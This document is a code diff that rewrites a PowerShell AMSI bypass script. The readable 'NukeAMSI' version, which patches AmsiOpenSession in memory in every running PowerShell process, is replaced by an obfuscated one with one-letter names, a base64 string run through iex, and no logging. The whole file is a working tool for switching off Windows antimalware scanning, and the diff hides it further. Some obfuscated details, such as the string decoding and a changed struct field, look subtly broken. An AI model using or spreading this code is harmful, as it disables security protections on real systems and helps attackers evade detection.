@@ -1,148 +1,25 @@
-Write-Host $banner -ForegroundColor Green
+$B=[System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('VwByAGkAdABlAC0ASABvAHMAdAAgACIAUwB0AGEAcgB0AGkAbgBnACAATgB1AGsAZQAgAEEATQBTAEkAIABzAGMAcgBpAHAAdAAuAC4ALgAiACAA
+LQBGAG8AcgBlAGcAcgBvAHUAbgBkAEMAbwBsAG8AcgAgAEMAeQBhAG4A'));iex $B;$C=Read-Host "Are you ready?";Add-Type -Ty @"
+using System;using System.Diagnostics;using System.Runtime.InteropServices;
+public class T{public const int A=0x8,B=0x10,C=0x20;public const uint D=0x40;
+[DllImport("ntdll.dll")]public static extern int NtOpenProcess(out IntPtr E,uint F,[In]ref G H,[In]ref I J);
+[DllImport("ntdll.dll")]public static extern int NtWriteVirtualMemory(IntPtr K,IntPtr L,byte[] M,uint N,out uint O);
+[DllImport("ntdll.dll")]public static extern int NtClose(IntPtr P);
+[DllImport("kernel32.dll",SetLastError=true)]public static extern IntPtr LoadLibrary(string Q);
+[DllImport("kernel32.dll",SetLastError=true)]public static extern IntPtr GetProcAddress(IntPtr R,string S);
+[DllImport("kernel32.dll",SetLastError=true)]public static extern bool VirtualProtectEx(IntPtr T,IntPtr U,UIntPtr V,uint W,out uint X);
+[StructLayout(LayoutKind.Sequential)]public struct G{public int Y;public IntPtr Z,A,B;public IntPtr C,D;}
+[StructLayout(LayoutKind.Sequential)]public struct I{public IntPtr E,F;}}"@
 
+function p{param([int]$x)
+$y=[byte]0xEB;$z=New-Object T+G;$a=New-Object T+I;$a.E=[IntPtr]$x;$a.F=[IntPtr]::Zero;$z.Y=[Runtime.InteropServices.Marshal]::SizeOf($z)
+$b=[IntPtr]::Zero;$c=[T]::NtOpenProcess([ref]$b,[T]::A -bor [T]::B -bor [T]::C,[ref]$z,[ref]$a);if($c -ne 0){return}
+$d=[T]::LoadLibrary("amsi.dll");if($d -eq [IntPtr]::Zero){[T]::NtClose($b);return}
+$e=[T]::GetProcAddress($d,"AmsiOpenSession");if($e -eq [IntPtr]::Zero){[T]::NtClose($b);return}
+$f=[IntPtr]($e.ToInt64()+3);$g=[UInt32]0;$h=[UIntPtr]::new(1)
+$i=[T]::VirtualProtectEx($b,$f,$h,[T]::D,[ref]$g);if(-not $i){[T]::NtClose($b);return}
+$j=[UInt32]0;$k=[T]::NtWriteVirtualMemory($b,$f,[byte[]]@($y),1,[ref]$j)
+$l=[T]::VirtualProtectEx($b,$f,$h,$g,[ref]$g);[T]::NtClose($b)}
 
-# Prompt the user for confirmation
-$confirmation = Read-Host "Are you ready to nuke AMSI from this shell? Press Enter to continue"
-
-
-Add-Type -TypeDefinition @"
-using System;
-using System.Diagnostics;
-using System.Runtime.InteropServices;
-
-public class NukeAMSI
-{
-    public const int PROCESS_VM_OPERATION = 0x0008;
-    public const int PROCESS_VM_READ = 0x0010;
-    public const int PROCESS_VM_WRITE = 0x0020;
-    public const uint PAGE_EXECUTE_READWRITE = 0x40;
-
-    // NtOpenProcess: Opens a handle to a process.
-    [DllImport("ntdll.dll")]
-    public static extern int NtOpenProcess(out IntPtr ProcessHandle, uint DesiredAccess, [In] ref OBJECT_ATTRIBUTES ObjectAttributes, [In] ref CLIENT_ID ClientId);
-
-    // NtWriteVirtualMemory: Writes to the memory of a process.
-    [DllImport("ntdll.dll")]
-    public static extern int NtWriteVirtualMemory(IntPtr ProcessHandle, IntPtr BaseAddress, byte[] Buffer, uint NumberOfBytesToWrite, out uint NumberOfBytesWritten);
-
-    // NtClose: Closes an open handle.
-    [DllImport("ntdll.dll")]
-    public static extern int NtClose(IntPtr Handle);
-
-    // LoadLibrary: Loads the specified module into the address space of the calling process.
-    [DllImport("kernel32.dll", SetLastError = true)]
-    public static extern IntPtr LoadLibrary(string lpFileName);
-
-    // GetProcAddress: Retrieves the address of an exported function or variable from the specified dynamic-link library (DLL).
-    [DllImport("kernel32.dll", SetLastError = true)]
-    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
-
-    // VirtualProtectEx: Changes the protection on a region of memory within the virtual address space of a specified process.
-    [DllImport("kernel32.dll", SetLastError = true)]
-    public static extern bool VirtualProtectEx(IntPtr hProcess, IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
-
-    [StructLayout(LayoutKind.Sequential)]
-    public struct OBJECT_ATTRIBUTES
-    {
-        public int Length;
-        public IntPtr RootDirectory;
-        public IntPtr ObjectName;
-        public int Attributes;
-        public IntPtr SecurityDescriptor;
-        public IntPtr SecurityQualityOfService;
-    }
-
-    [StructLayout(LayoutKind.Sequential)]
-    public struct CLIENT_ID
-    {
-        public IntPtr UniqueProcess;
-        public IntPtr UniqueThread;
-    }
-}
-"@
-
-function ModAMSI {
-    param (
-        [int]$processId
-    )
-
-    Write-Host "Modifying AMSI for process ID: $processId" -ForegroundColor Cyan
-
-    $patch = [byte]0xEB  # The patch byte to modify AMSI behavior
-
-    $objectAttributes = New-Object NukeAMSI+OBJECT_ATTRIBUTES
-    $clientId = New-Object NukeAMSI+CLIENT_ID
-    $clientId.UniqueProcess = [IntPtr]$processId
-    $clientId.UniqueThread = [IntPtr]::Zero
-    $objectAttributes.Length = [System.Runtime.InteropServices.Marshal]::SizeOf($objectAttributes)
-
-    $hHandle = [IntPtr]::Zero
-    $status = [NukeAMSI]::NtOpenProcess([ref]$hHandle, [NukeAMSI]::PROCESS_VM_OPERATION -bor [NukeAMSI]::PROCESS_VM_READ -bor [NukeAMSI]::PROCESS_VM_WRITE, [ref]$objectAttributes, [ref]$clientId)
-
-    if ($status -ne 0) {
-        Write-Host "Failed to open process. NtOpenProcess status: $status" -ForegroundColor Red
-        return
-    }
-
-    Write-Host "Loading amsi.dll..." -ForegroundColor Cyan
-    $amsiHandle = [NukeAMSI]::LoadLibrary("amsi.dll")
-    if ($amsiHandle -eq [IntPtr]::Zero) {
-        Write-Host "Failed to load amsi.dll." -ForegroundColor Red
-        [NukeAMSI]::NtClose($hHandle)
-        return
-    }
-
-    Write-Host "Getting address of AmsiOpenSession function..." -ForegroundColor Cyan
-    $amsiOpenSession = [NukeAMSI]::GetProcAddress($amsiHandle, "AmsiOpenSession")
-    if ($amsiOpenSession -eq [IntPtr]::Zero) {
-        Write-Host "Failed to find AmsiOpenSession function in amsi.dll." -ForegroundColor Red
-        [NukeAMSI]::NtClose($hHandle)
-        return
-    }
-
-    # Calculate the correct patch address by offsetting from AmsiOpenSession function
-    $patchAddr = [IntPtr]($amsiOpenSession.ToInt64() + 3)
-
-    Write-Host "Changing memory protection at address $patchAddr to PAGE_EXECUTE_READWRITE..." -ForegroundColor Cyan
-    $oldProtect = [UInt32]0
-    $size = [UIntPtr]::new(1)  # Correct conversion to UIntPtr
-    $protectStatus = [NukeAMSI]::VirtualProtectEx($hHandle, $patchAddr, $size, [NukeAMSI]::PAGE_EXECUTE_READWRITE, [ref]$oldProtect)
-
-    if (-not $protectStatus) {
-        Write-Host "Failed to change memory protection." -ForegroundColor Red
-        [NukeAMSI]::NtClose($hHandle)
-        return
-    }
-
-    Write-Host "Patching memory at address $patchAddr with byte 0xEB..." -ForegroundColor Cyan
-    $bytesWritten = [System.UInt32]0
-    $status = [NukeAMSI]::NtWriteVirtualMemory($hHandle, $patchAddr, [byte[]]@($patch), 1, [ref]$bytesWritten)
-
-    if ($status -eq 0) {
-        Write-Host "Memory patched successfully at address $patchAddr." -ForegroundColor Green
-    } else {
-        Write-Host "Failed to patch memory. NtWriteVirtualMemory status: $status" -ForegroundColor Red
-    }
-
-    Write-Host "Restoring original memory protection..." -ForegroundColor Cyan
-    $restoreStatus = [NukeAMSI]::VirtualProtectEx($hHandle, $patchAddr, $size, $oldProtect, [ref]$oldProtect)
-
-    if (-not $restoreStatus) {
-        Write-Host "Failed to restore memory protection." -ForegroundColor Red
-    }
-
-    Write-Host "Closing handle to process with ID $processId." -ForegroundColor Cyan
-    [NukeAMSI]::NtClose($hHandle)
-}
-
-function ModAllPShells {
-    Write-Host "Modifying all PowerShell processes..." -ForegroundColor Cyan
-    Get-Process | Where-Object { $_.ProcessName -eq "powershell" } | ForEach-Object {
-        Write-Host "Modifying process with ID $_.Id" -ForegroundColor Cyan
-        ModAMSI -processId $_.Id
-    }
-}
-
-Write-Host "Starting AMSI modification script..." -ForegroundColor Cyan
-ModAllPShells
-Write-Host "AMSI modification script completed." -ForegroundColor Green
+function q{Get-Process|?{$_.ProcessName -eq "powershell"}|%{p -x $_.Id}}
+q
